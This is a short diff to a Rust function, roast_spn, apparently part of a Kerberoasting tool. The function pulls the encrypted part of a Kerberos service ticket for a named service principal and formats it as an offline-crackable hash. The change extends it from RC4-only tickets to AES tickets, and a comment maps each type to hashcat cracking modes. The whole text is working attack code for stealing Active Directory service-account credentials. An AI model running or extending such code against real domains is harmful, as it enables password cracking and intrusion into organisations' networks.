@@ -259,8 +259,11 @@ pub async fn roast_spn(tgt: &Tgt, sam: &str, spn: &str, kdc: &str) -> Result<Str
     // The crackable material is the *service ticket* enc-part.
     let tkt_enc = &tgs_rep.0.ticket.0 .0.enc_part.0;
     let etype = tkt_enc.etype.0 .0.iter().fold(0u32, |a, &b| (a << 8) | b as u32);
-    if etype != ETYPE_RC4_HMAC as u32 {
-        bail!("service ticket came back etype {etype} (AES) — RC4 hash unavailable for {spn}");
-    }
-    Ok(format_tgs(sam, &tgt.crealm, spn, &tkt_enc.cipher.0 .0))
+    let cipher = &tkt_enc.cipher.0 .0;
+    // RC4 (23) → hashcat 13100; AES128/256 (17/18) → hashcat 19600/19700.
+    Ok(if etype == ETYPE_RC4_HMAC as u32 {
+        format_tgs(sam, &tgt.crealm, spn, cipher)
+    } else {
+        crate::format_tgs_aes(sam, &tgt.crealm, spn, etype as u8, cipher)
+    })
 }
